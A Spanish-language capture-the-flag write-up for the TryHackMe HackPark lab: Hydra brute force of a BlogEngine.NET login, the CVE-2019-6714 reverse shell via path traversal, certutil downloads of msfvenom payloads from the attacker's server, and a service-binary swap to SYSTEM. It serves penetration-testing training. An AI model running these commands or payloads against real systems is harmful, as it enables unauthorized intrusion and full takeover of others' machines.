# HackPark — TryHackMe Writeup

## 📌 Información general

> [!info]  
> **Nombre de la máquina:** HackPark  
> **Plataforma:** TryHackMe  
> **Dificultad:** Easy / Easy-Medium  
> **Sistema operativo víctima:** Windows Server 2012 R2  
> **Sistema operativo atacante:** Kali Linux  
> **IP víctima:** 10.129.181.63  
> **Categoría:** Web Exploitation + Windows Privilege Escalation  
> **CMS vulnerable:** BlogEngine.NET  
> **CVE explotado:** CVE-2019-6714

---

## 1. Reconocimiento inicial

Como en cualquier máquina de laboratorio o auditoría, el primer paso consiste en enumerar la superficie de ataque expuesta.

Antes de intentar explotar nada, necesitamos saber:

- qué servicios ofrece el objetivo
    
- en qué puertos
    
- con qué tecnologías
    

### 🔍 Escaneo con Nmap

```bash
nmap -sC -sV -p- 10.129.181.63
```

### ❓ ¿Por qué usamos este comando?

- `-sC`: scripts por defecto (enumeración básica automática)
    
- `-sV`: detección de versiones
    
- `-p-`: escaneo de TODOS los puertos TCP
    

### 📊 Salida esperada

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 8.5
3389/tcp open  ms-wbt-server Microsoft Terminal Services

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### 🧠 Análisis

- Puerto **80 → web (entrada principal)**
    
- Puerto **3389 → RDP (no útil aún)**
    
- Servidor **IIS 8.5 → entorno Windows / ASP.NET**
    

👉 Siguiente paso: **enumeración web**

---

## 2. Enumeración web

Acceso:

```
http://10.129.181.63
```

### 🎯 Objetivo

Buscar:

- rutas interesantes
    
- login
    
- tecnología
    
- errores
    

### 🔎 Hallazgo

```
/Account/login.aspx
```

👉 ASP.NET Web Forms → uso de:

- `__VIEWSTATE`
    
- `__EVENTVALIDATION`
    

---

## 3. Análisis del login (Burp)

### 📥 Petición capturada

```
POST /Account/login.aspx HTTP/1.1
Host: 10.129.181.63

__VIEWSTATE=...
__EVENTVALIDATION=...
ctl00$MainContent$LoginUser$UserName=admin
ctl00$MainContent$LoginUser$Password=test
```

### 🧠 Qué hacemos

- entender el formulario
    
- parámetros exactos
    
- mensaje de error
    

👉 Hydra necesita esto para funcionar correctamente

---

## 4. Fuerza bruta con Hydra

### 🎯 Objetivo

Obtener credenciales del panel admin

### ⚙️ Comando

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.181.63 http-post-form "/Account/login.aspx:ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^:F=Login failed"
```

### 📌 Explicación

- `-l admin` → usuario fijo
    
- `-P` → wordlist
    
- `^USER^ ^PASS^` → placeholders
    
- `F=Login failed` → detectar fallo
    

### ✅ Resultado

```
login: admin   password: ******
```

👉 Acceso al panel

---

## 5. Identificación del CMS

### 🔍 Encontrado

```
BlogEngine.NET 3.3.6
```

👉 Clave para buscar exploits

---

## 6. Búsqueda de exploit

```bash
searchsploit blogengine
```

### 🎯 Resultado

```
BlogEngine.NET 3.3.6 - RCE
```

👉 Tenemos ejecución remota

---

## 7. Preparación del exploit

```bash
searchsploit -m 46353
```

### 🧠 Qué hace

- archivo `.ascx`
    
- ejecución en IIS
    
- reverse shell
    

---

## 8. Edición del payload

```csharp
TcpClient("192.168.130.29", 4444)
```

👉 Configurar:

- LHOST
    
- LPORT
    

---

## 9. Subida del archivo

Nombre:

```
PostView.ascx
```

---

## 10. Ejecución del exploit

### 🎧 Listener

```bash
nc -lvnp 4444
```

### 🌐 Trigger

```
http://10.129.181.63/?theme=../../App_Data/files/PostView.ascx
```

### ✅ Resultado

```
c:\windows\system32\inetsrv>
```

👉 RCE conseguido

---

## 11. Estabilización de shell

### ⚙️ Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.130.29 LPORT=6666 -f exe > shell_stable.exe
```

### 🌐 Servidor

```bash
python3 -m http.server 8000
```

### 📥 Descarga

```cmd
certutil -urlcache -split -f http://192.168.130.29:8000/shell_stable.exe shell_stable.exe
```

### ▶️ Ejecución

```cmd
shell_stable.exe
```

---

## 12. Enumeración con winPEAS

```cmd
winPEAS.bat
```

👉 Busca:

- servicios
    
- permisos
    
- credenciales
    

---

## 13. Hallazgo clave

```
WindowsScheduler
C:\PROGRA~2\SYSTEM~1\WService.exe
```

👉 Posible vector de privesc

---

## 14. Escalada de privilegios

### ⚙️ Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.130.29 LPORT=5555 -f exe > shell2.exe
```

### 🔁 Reemplazo

```cmd
certutil -urlcache -split -f http://192.168.130.29:8000/shell2.exe message.exe
```

👉 Se ejecuta como SYSTEM

---

## 15. Acceso privilegiado

### 🎧 Listener

```bash
nc -lvnp 5555
```

### 📌 Verificación

```cmd
whoami
```

```
nt authority\system
```

👉 Control total

---

## 16. Flags

### 🧑 User

```cmd
C:\Users\Jeff\Desktop
```

### 👑 Root

```cmd
C:\Users\Administrator\Desktop
```

---

## 17. Herramientas

### 🔍 Recon

- nmap
    
- navegador
    
- burp
    

### 🔐 Fuerza bruta

- hydra
    
- rockyou
    

### 💣 Explotación

- searchsploit
    

### 🔁 Shells

- nc
    
- msfvenom
    
- certutil
    

### 🔎 Privesc

- winPEAS
    
- sc
    
- icacls
    

---

## 18. Vulnerabilidades

1. Credenciales débiles
    
2. CVE-2019-6714 (RCE)
    
3. Servicio vulnerable
    

